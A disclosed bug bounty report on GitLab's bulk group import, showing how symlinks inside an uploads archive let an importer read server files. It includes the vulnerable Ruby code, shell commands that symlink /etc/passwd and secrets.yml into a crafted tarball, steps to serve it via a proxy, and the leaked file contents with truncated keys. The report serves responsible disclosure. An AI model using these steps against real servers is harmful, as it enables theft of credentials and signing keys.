# Arbitrary file read  via the bulk imports UploadsPipeline

## Report Details
- **Report ID**: 1439593
- **URL**: https://hackerone.com/reports/1439593
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2022-01-03T01:57:54.059Z
- **Disclosed**: 2022-03-21T14:46:33.605Z

## Reporter
- **Username**: vakzz
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gitlab

## Vulnerability Information
### Summary

The bulk imports api does not remove symlinks when untaring the uploads.tar.gz file, allowing arbitrary files to be read and uploaded when importing a group.

When a group has uploads (such as markdown attachments), an `uploads.tar.gz` file will be downloaded and extracted in the `UploadsPipeline`:
https://gitlab.com/gitlab-org/gitlab/-/blob/v14.6.0-ee/lib/bulk_imports/common/pipelines/uploads_pipeline.rb#L15
```ruby
       def extract(context)
          download_service(tmp_dir, context).execute
          untar_zxf(archive: File.join(tmp_dir, FILENAME), dir: tmp_dir)
          upload_file_paths = Dir.glob(File.join(tmp_dir, '**', '*'))

          BulkImports::Pipeline::ExtractedData.new(data: upload_file_paths)
        end
```

Since `untar_zxf` only changes the permissions, any symlinks that are extracted from the tar will remain and be added to the list of file paths. When `load` is called, the symlinks will be followed and used as the content for the new file:

https://gitlab.com/gitlab-org/gitlab/-/blob/v14.6.0-ee/lib/bulk_imports/common/pipelines/uploads_pipeline.rb#L23
```ruby
        def load(context, file_path)
          avatar_path = AVATAR_PATTERN.match(file_path)

          return save_avatar(file_path) if avatar_path

          dynamic_path = file_uploader.extract_dynamic_path(file_path)

          return unless dynamic_path
          return if File.directory?(file_path)

          named_captures = dynamic_path.named_captures.symbolize_keys

          UploadService.new(context.portable, File.open(file_path, 'r'), file_uploader, **named_captures).execute
        end
``` 

This can be used to read any file that the git user has read access to such as secrets.yml or other sensitive files.

### Steps to reproduce

1. Create a new group on gitlab.com
1. Create a new milestone and upload a file `passwd` with any content into the description
1. Make note of the upload secret (the 32 byte hash in the path)
1. Run the following commands to make a tar file, using the hash from above
    ```bash
mkdir ./d3209c811fee407218bff7cb3b4333e6
ln -s /etc/passwd ./d3209c811fee407218bff7cb3b4333e6/passwd
ln -s /srv/gitlab/config/secrets.yml ./d3209c811fee407218bff7cb3b4333e6/secrets.yml
tar cvzf uploads.tar.gz ./d3209c811fee407218bff7cb3b4333e6
    ```

1. Save the following simple proxy server as `api.py` and run it with `FLASK_APP=api flask run`, this will replace the `uploads.tar.gz` with a custom one: {F1565789}
1. Start [ngrok](https://ngrok.com/) so that it's externally accessible: `ngrok http 5000`
1. Create a new access token at https://gitlab.com/-/profile/personal_access_tokens
1. Create a new group, this time choose import group
1. Enter the https ngrok url and the token you just created
1. Select the group you initially created and choose a new name
1. Once the import has complete, view the milestone and click the passwd link
1. You will see the passwd file from the gitlab server
1. Copy the link and change `passwd` to `secrets.yml` and you should be able to download the secrets file


### Impact

A user with access to import a group on gitlab can read arbitrary files on the gitlab server

### Examples

Example with `passwd` and `secrets.yml` attached:
https://gitlab.com/groups/group_to_import_1/-/milestones/1
https://gitlab.com/groups/group_to_import_1/-/uploads/d3209c811fee407218bff7cb3b4333e6/passwd
https://gitlab.com/groups/group_to_import_1/-/uploads/d3209c811fee407218bff7cb3b4333e6/secrets.yml

### What is the current *bug* behavior?
Symlinks are not removed or filtered when the `UploadsPipeline` is run for the bulk imports api

### What is the expected *correct* behavior?
Symlinks should be removed similar to the project import

### Relevant logs and/or screenshots
/etc/passwd file:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
git:x:1000:1000:GitLab,,,:/home/git:/bin/bash
```

/srv/gitlab/config/secrets.yml file:
```yaml
production:
  secret_key_base: 1174116b6adee.....
  otp_key_base: staging-a680efdeb2e93751f32.....
  db_key_base: 1174116b6adee59.....
  openid_connect_signing_key: |
    -----BEGIN RSA PRIVATE KEY-----
    MIIJKQIBAAKCAgEA5RyvCSgBoOGNE03CMcJ9.....
    -----END RSA PRIVATE KEY-----
  ci_jwt_signing_key: |
    -----BEGIN RSA PRIVATE KEY-----
    MIIEpAIBAAKCAQEAvazHHoAHZB5j9RUyq0CEK9.....
    -----END RSA PRIVATE KEY-----


### Output of checks
This bug happens on GitLab.com

## Impact

A user with access to import a group on gitlab can read arbitrary files on the gitlab server

## Attachments
- api.py
